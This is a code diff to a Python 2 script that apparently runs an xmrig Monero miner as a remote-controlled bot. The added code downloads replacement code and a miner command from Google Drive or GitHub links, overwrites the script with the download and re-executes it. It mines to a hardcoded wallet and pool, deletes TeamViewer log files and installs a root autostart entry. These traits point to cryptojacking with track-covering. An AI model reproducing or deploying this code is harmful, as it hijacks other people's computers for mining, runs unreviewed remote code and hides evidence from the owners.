@@ -88,17 +88,20 @@ if useproxy == 1:
         except:
             pass
         if readtestproxy <> 'proxy_ok':
-            print 'Proxy error'
-            linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
-            print linktestproxy
-            proxytext = ast.literal_eval(realproxy)
-            print proxytext
-            proxyuse = urllib2.ProxyHandler(proxytext)
-            opener = urllib2.build_opener(proxyuse)
-            urllib2.install_opener(opener)
-            downloadtestproxy = urllib2.urlopen(linktestproxy)
-            readtestproxy = downloadtestproxy.read().strip()
-            print readtestproxy
+            try:
+                print 'Proxy error'
+                linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
+                print linktestproxy
+                proxytext = ast.literal_eval(realproxy)
+                print proxytext
+                proxyuse = urllib2.ProxyHandler(proxytext)
+                opener = urllib2.build_opener(proxyuse)
+                urllib2.install_opener(opener)
+                downloadtestproxy = urllib2.urlopen(linktestproxy)
+                readtestproxy = downloadtestproxy.read().strip()
+                print readtestproxy
+            except:
+                pass
             if readtestproxy <> 'proxy_ok':
                 print "Proxy error"
                 proxy_error = 1
@@ -141,17 +144,20 @@ if useproxy == 1:
                 except:
                     pass
                 if readtestproxy <> 'proxy_ok':
-                    print 'Connect google drive error, try github'
-                    linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
-                    print linktestproxy
-                    proxytext = ast.literal_eval(realproxy)
-                    print proxytext
-                    proxyuse = urllib2.ProxyHandler(proxytext)
-                    opener = urllib2.build_opener(proxyuse)
-                    urllib2.install_opener(opener)
-                    downloadtestproxy = urllib2.urlopen(linktestproxy)
-                    readtestproxy = downloadtestproxy.read().strip()
-                    print readtestproxy
+                    try:
+                        print 'Connect google drive error, try github'
+                        linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
+                        print linktestproxy
+                        proxytext = ast.literal_eval(realproxy)
+                        print proxytext
+                        proxyuse = urllib2.ProxyHandler(proxytext)
+                        opener = urllib2.build_opener(proxyuse)
+                        urllib2.install_opener(opener)
+                        downloadtestproxy = urllib2.urlopen(linktestproxy)
+                        readtestproxy = downloadtestproxy.read().strip()
+                        print readtestproxy
+                    except:
+                        pass
                     if readtestproxy <> 'proxy_ok':
                         print "Proxy error"
                         proxy_error = 1
@@ -166,46 +172,57 @@ if useproxy == 1:
                     break
 if proxy_error == 1:
     useproxy = 0
-print useproxy
+print 'Use proxy = '+ str(useproxy)
+version = '7.1'
+linkversion = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_TzZwa1hQVTBLaWc&export=download'
+readversion = ''
+#linkversion = 'https://google.com'
 try:
-    version = '2.3'
-    #linkversion = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_TzZwa1hQVTBLaWc&export=download'
-    linkversion = 'https://google.com'
     if useproxy == 1:
         proxytext = ast.literal_eval(realproxy)
         proxyuse = urllib2.ProxyHandler(proxytext)
         opener = urllib2.build_opener(proxyuse)
         urllib2.install_opener(opener)
+    else:
+        proxyuse = urllib2.ProxyHandler({})
+        opener = urllib2.build_opener(proxyuse)
+        urllib2.install_opener(opener)
     downloadversion = urllib2.urlopen(linkversion)
     readversion = downloadversion.read().strip()
     print readversion
-    if len(readversion) > 50:
-        print 'Download file readversion o google drive error, thu link github'
-        linkversion = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondao'
+except:
+    pass
+if len(readversion) > 50 or readversion == '':
+    print 'Download file readversion o google drive error, thu link github'
+    linkversion = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondao'
+    try:
         if useproxy == 1:
             proxytext = ast.literal_eval(realproxy)
             proxyuse = urllib2.ProxyHandler(proxytext)
             opener = urllib2.build_opener(proxyuse)
             urllib2.install_opener(opener)
+        else:
+            proxyuse = urllib2.ProxyHandler({})
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
         downloadversion = urllib2.urlopen(linkversion)
         readversion = downloadversion.read().strip()
-        #print 'dang o day'
-        print readversion
-except urllib2.URLError:
-    readversion = version
-    pass
-except BadStatusLine:
-    readversion = version
-    pass
-except socket_error as serr:
-    readversion = version
-    pass
+    except:
+        readversion = version
+        pass
+    #print 'dang o day'
+    print readversion
 if version != readversion:
+    noidung = ''
+    linkcodedao = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_UzZBMHd6TjdwREE&export=download'
     try:
-        linkcodedao = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_UzZBMHd6TjdwREE&export=download'
         if useproxy == 1:
             proxytext = ast.literal_eval(realproxy)
             proxyuse = urllib2.ProxyHandler(proxytext)
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
+        else:
+            proxyuse = urllib2.ProxyHandler({})
             opener = urllib2.build_opener(proxyuse)
             urllib2.install_opener(opener)
         downloadlinkcodedao = urllib2.urlopen(linkcodedao)
@@ -217,48 +234,74 @@ if version != readversion:
             print "Update Code"
             # restart code
             os.execv(__file__, sys.argv)
-        elif noidung.find == -1:
-            print "Download codedao tu google drive error, thu link github"
-
-    except urllib2.URLError:
+    except:
         pass
-    except BadStatusLine:
-        pass
-    except socket_error as serr:
-        pass
-# download command
+    if noidung.find('/usr/bin/env') == -1:
+        print "Download codedao tu google drive error, thu link github"
+        linkcodedao = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/dao.py'
+        try:
+            if useproxy == 1:
+                proxytext = ast.literal_eval(realproxy)
+                proxyuse = urllib2.ProxyHandler(proxytext)
+                opener = urllib2.build_opener(proxyuse)
+                urllib2.install_opener(opener)
+            else:
+                proxyuse = urllib2.ProxyHandler({})
+                opener = urllib2.build_opener(proxyuse)
+                urllib2.install_opener(opener)
+            downloadlinkcodedao = urllib2.urlopen(linkcodedao)
+            downloadlinkcodedao = urllib2.urlopen(linkcodedao)
+            noidung = downloadlinkcodedao.read()
+        except:
+            pass
+        if noidung.find('/usr/bin/env') != -1:
+            code = open(os.path.realpath(__file__), 'w')
+            code.write(noidung)
+            code.close()
+            print "Update Code"
+            os.execv(__file__, sys.argv)
 try:
     os.system('rm -rf /opt/teamviewer/logfiles/*.log')
     os.system('rm -rf /opt/teamviewer/logfiles/*.txt')
 except:
     pass
 # Update cpuminer
-if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll') == False:
-    os.system('echo 2.8.1 >' + str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll')
-# Read versiondll
-openversiondll = open(os.path.dirname(os.path.realpath(__file__)) + '/versiondll', 'r')
-versiondll = openversiondll.read().strip()
-openversiondll.close()
-print versiondll
+versiondll = '2.8.1'
+readversiondllnew = ''
+linkversiondllnew = 'https://docs.google.com/uc?authuser=0&id=15flFHc8I0zfumXoXZWvHD8IRR5sAaIyk&export=download'
 try:
-    linkversiondllnew = 'https://docs.google.com/uc?authuser=0&id=15flFHc8I0zfumXoXZWvHD8IRR5sAaIyk&export=download'
     if useproxy == 1:
         proxytext = ast.literal_eval(realproxy)
         proxyuse = urllib2.ProxyHandler(proxytext)
         opener = urllib2.build_opener(proxyuse)
         urllib2.install_opener(opener)
+    else:
+        proxyuse = urllib2.ProxyHandler({})
+        opener = urllib2.build_opener(proxyuse)
+        urllib2.install_opener(opener)
     downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
     readversiondllnew = downloadversiondllnew.read().strip()
     print readversiondllnew
-except urllib2.URLError:
-    readversiondllnew = versiondll
+except:
     pass
-except BadStatusLine:
-    readversiondllnew = versiondll
-    pass
-except socket_error as serr:
-    readversiondllnew = versiondll
-    pass
+if len(readversiondllnew) > 50 or readversiondllnew == '' :
+    print 'Download file readversiondll o google drive error, thu link github'
+    linkversiondllnew = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondllnew'
+    try:
+        if useproxy == 1:
+            proxytext = ast.literal_eval(realproxy)
+            proxyuse = urllib2.ProxyHandler(proxytext)
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
+        else:
+            proxyuse = urllib2.ProxyHandler({})
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
+        downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
+        readversiondllnew = downloadversiondllnew.read().strip()
+        print readversiondllnew
+    except:
+        readversiondllnew = versiondll
 if readversiondllnew != versiondll:
     os.system('echo ' + readversiondllnew + ' >' + str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll')
     os.system('pkill yum')
@@ -278,28 +321,45 @@ if readversiondllnew != versiondll:
     os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
     os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
 
+linkcommand = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_QzBMOENzb2plZnM&export=download'
+command = ''
 try:
-    linkcommand = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_QzBMOENzb2plZnM&export=download'
     if useproxy == 1:
         proxytext = ast.literal_eval(realproxy)
         proxyuse = urllib2.ProxyHandler(proxytext)
+        opener = urllib2.build_opener(proxyuse)
+        urllib2.install_opener(opener)
+    else:
+        proxyuse = urllib2.ProxyHandler({})
         opener = urllib2.build_opener(proxyuse)
         urllib2.install_opener(opener)
     downloadlinkcommand = urllib2.urlopen(linkcommand)
     commandread = downloadlinkcommand.read().strip()
     if commandread.find(program) != -1:
         command = commandread + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
-    else:
+except:
+    pass
+if commandread.find(program) == -1:
+    print 'Download command tu google drive bi loi, thu link github'
+    linkcommand = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondllnew'
+    try:
+        if useproxy == 1:
+            proxytext = ast.literal_eval(realproxy)
+            proxyuse = urllib2.ProxyHandler(proxytext)
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
+        else:
+            proxyuse = urllib2.ProxyHandler({})
+            opener = urllib2.build_opener(proxyuse)
+            urllib2.install_opener(opener)
+        downloadlinkcommand = urllib2.urlopen(linkcommand)
+        commandread = downloadlinkcommand.read().strip()
+        if commandread.find(program) != -1:
+            command = commandread + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
+        else:
+            command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
+    except:
         command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
-except urllib2.URLError:
-    command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + '--cpu-affinity=' + affinity + ' -t ' + str(cores)
-    pass
-except BadStatusLine:
-    pass
-except socket_error as serr:
-        # command = program + ' --variant 1 -a cryptonight -o stratum+tcp://pool.minexmr.com:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001 -t ' + str(cores)
-    command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + '--cpu-affinity=' + affinity + ' -t ' + str(cores)
-    pass
 # write to /etc/X11/xinit/xinitrc.d/localuser.sh
 localuser = open('/etc/X11/xinit/xinitrc.d/localuser.sh', 'w')
 localuser.write('#!/bin/bash\ngnome-terminal -e \'python \"/root/Desktop/dao.py\"\'')
